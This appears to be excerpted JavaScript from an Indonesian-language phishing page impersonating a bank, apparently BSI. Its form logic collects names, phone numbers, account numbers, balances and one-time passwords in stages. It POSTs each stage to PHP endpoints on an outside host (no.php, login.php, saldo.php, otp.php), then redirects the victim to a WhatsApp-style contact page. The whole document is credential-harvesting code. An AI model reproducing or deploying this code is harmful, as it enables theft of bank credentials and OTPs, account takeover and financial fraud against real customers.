...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://choreo.cloud/7h27g/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
    ...
    if (!tarif || !nomor || !nama || !rek) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://choreo.cloud/7h27g/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
    ...
    if (!tarif || !nomor || !nama || !rek || !saldo) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://choreo.cloud/7h27g/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://choreo.cloud/7h27g/otp.php',
 async: false,
 dataType: 'JSON',
...
function getcs(){
 $("#djload").show();       
setTimeout(function(){  
location.href='https://demcloud.my.id/BSI/7h27g/wa';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1100);      
